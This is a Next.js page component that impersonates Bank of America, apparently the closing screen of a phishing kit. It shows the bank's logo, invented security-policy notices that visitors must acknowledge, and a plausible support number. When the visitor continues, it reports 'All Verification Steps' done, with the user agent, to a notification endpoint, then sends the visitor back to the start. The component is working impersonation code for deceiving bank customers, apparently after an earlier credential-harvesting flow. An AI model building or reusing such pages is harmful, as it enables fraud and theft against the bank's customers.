"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { ArrowLeft, Shield, AlertTriangle, CheckCircle, Bell, Lock, Eye, Smartphone } from "lucide-react"

export default function SecurityNewsPage() {
  const router = useRouter()
  const [acknowledgedPolicies, setAcknowledgedPolicies] = useState<string[]>([])

  const handlePolicyAcknowledge = (policyId: string) => {
    if (!acknowledgedPolicies.includes(policyId)) {
      setAcknowledgedPolicies((prev) => [...prev, policyId])
    }
  }

  const handleContinue = async () => {
    try {
      await fetch("/api/notify-verification-complete", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          step: "All Verification Steps",
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        }),
      })
    } catch (error) {
      console.error("Failed to notify verification completion:", error)
    }

    // In a real app, this would redirect to the main banking dashboard
    router.push("/")
  }

  const securityUpdates = [
    {
      id: "enhanced-2fa",
      title: "Enhanced Two-Factor Authentication",
      date: "December 15, 2024",
      type: "security",
      content:
        "We've upgraded our two-factor authentication system to provide better security for your account. All customers will now receive SMS or app-based verification codes for sensitive transactions.",
      action: "No action required - this enhancement is automatically active on your account.",
    },
    {
      id: "fraud-monitoring",
      title: "Advanced Fraud Monitoring",
      date: "December 10, 2024",
      type: "protection",
      content:
        "Our new AI-powered fraud detection system now monitors your account 24/7 for suspicious activity. You'll receive instant alerts for any unusual transactions.",
      action: "Update your contact information to ensure you receive fraud alerts.",
    },
    {
      id: "secure-messaging",
      title: "Secure Message Center Updates",
      date: "December 5, 2024",
      type: "communication",
      content:
        "All sensitive communications will now be delivered through our secure message center instead of email. This ensures your personal information stays protected.",
      action: "Check your secure messages regularly in online banking.",
    },
    {
      id: "login-security",
      title: "Enhanced Login Security",
      date: "November 30, 2024",
      type: "access",
      content:
        "We've implemented additional security measures for account access, including device recognition and location-based verification for added protection.",
      action: "You may be prompted to verify your identity when logging in from new devices.",
    },
  ]

  const getIcon = (type: string) => {
    switch (type) {
      case "security":
        return <Shield className="w-6 h-6" />
      case "protection":
        return <Lock className="w-6 h-6" />
      case "communication":
        return <Bell className="w-6 h-6" />
      case "access":
        return <Eye className="w-6 h-6" />
      default:
        return <Shield className="w-6 h-6" />
    }
  }

  const getIconColor = (type: string) => {
    switch (type) {
      case "security":
        return "text-blue-600 bg-blue-100"
      case "protection":
        return "text-green-600 bg-green-100"
      case "communication":
        return "text-orange-600 bg-orange-100"
      case "access":
        return "text-purple-600 bg-purple-100"
      default:
        return "text-blue-600 bg-blue-100"
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-4">
          <div className="flex items-center space-x-4">
            <button onClick={() => router.back()} className="flex items-center text-blue-600 hover:text-blue-700">
              <ArrowLeft className="w-5 h-5 mr-2" />
              Back
            </button>
            <img src="/bank-of-america-logo.svg" alt="Bank of America" className="h-8" />
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto px-4 py-8">
        {/* Header Section */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <AlertTriangle className="w-8 h-8 text-red-600" />
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Important Security Updates</h1>
          <p className="text-gray-600 text-lg">
            Please review these important security policy updates to keep your account protected.
          </p>
        </div>

        {/* Security Updates */}
        <div className="space-y-6 mb-8">
          {securityUpdates.map((update) => (
            <div key={update.id} className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
              <div className="flex items-start space-x-4">
                <div
                  className={`w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0 ${getIconColor(update.type)}`}
                >
                  {getIcon(update.type)}
                </div>
                <div className="flex-1">
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="text-xl font-semibold text-gray-900">{update.title}</h3>
                    <span className="text-sm text-gray-500">{update.date}</span>
                  </div>
                  <p className="text-gray-700 mb-4 leading-relaxed">{update.content}</p>

                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
                    <p className="text-sm text-blue-800">
                      <strong>Action Required:</strong> {update.action}
                    </p>
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      {acknowledgedPolicies.includes(update.id) ? (
                        <div className="flex items-center text-green-600">
                          <CheckCircle className="w-5 h-5 mr-2" />
                          <span className="text-sm font-medium">Acknowledged</span>
                        </div>
                      ) : (
                        <Button
                          onClick={() => handlePolicyAcknowledge(update.id)}
                          variant="outline"
                          size="sm"
                          className="border-blue-600 text-blue-600 hover:bg-blue-50"
                        >
                          I Understand
                        </Button>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Security Tips */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-8">
          <h2 className="text-xl font-semibold text-gray-900 mb-4 flex items-center">
            <Smartphone className="w-6 h-6 mr-2 text-blue-600" />
            Additional Security Tips
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex items-start space-x-3">
              <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-gray-900">Enable Mobile Alerts</p>
                <p className="text-sm text-gray-600">Get instant notifications for all account activity</p>
              </div>
            </div>
            <div className="flex items-start space-x-3">
              <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-gray-900">Use Strong Passwords</p>
                <p className="text-sm text-gray-600">Create unique passwords for your banking accounts</p>
              </div>
            </div>
            <div className="flex items-start space-x-3">
              <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-gray-900">Monitor Your Accounts</p>
                <p className="text-sm text-gray-600">Review statements and transactions regularly</p>
              </div>
            </div>
            <div className="flex items-start space-x-3">
              <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-gray-900">Secure Your Devices</p>
                <p className="text-sm text-gray-600">Keep your devices updated and use screen locks</p>
              </div>
            </div>
          </div>
        </div>

        {/* Continue Button */}
        <div className="text-center">
          <Button
            onClick={handleContinue}
            disabled={acknowledgedPolicies.length < securityUpdates.length}
            className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-8 text-lg"
          >
            {acknowledgedPolicies.length < securityUpdates.length
              ? `Acknowledge All Updates (${acknowledgedPolicies.length}/${securityUpdates.length})`
              : "Continue to Banking"}
          </Button>

          {acknowledgedPolicies.length < securityUpdates.length && (
            <p className="text-sm text-gray-500 mt-2">Please acknowledge all security updates to continue</p>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center text-sm text-gray-500">
          <p>Questions about these updates? Call us at 1-800-432-1000 or visit your local branch.</p>
        </div>
      </div>
    </div>
  )
}
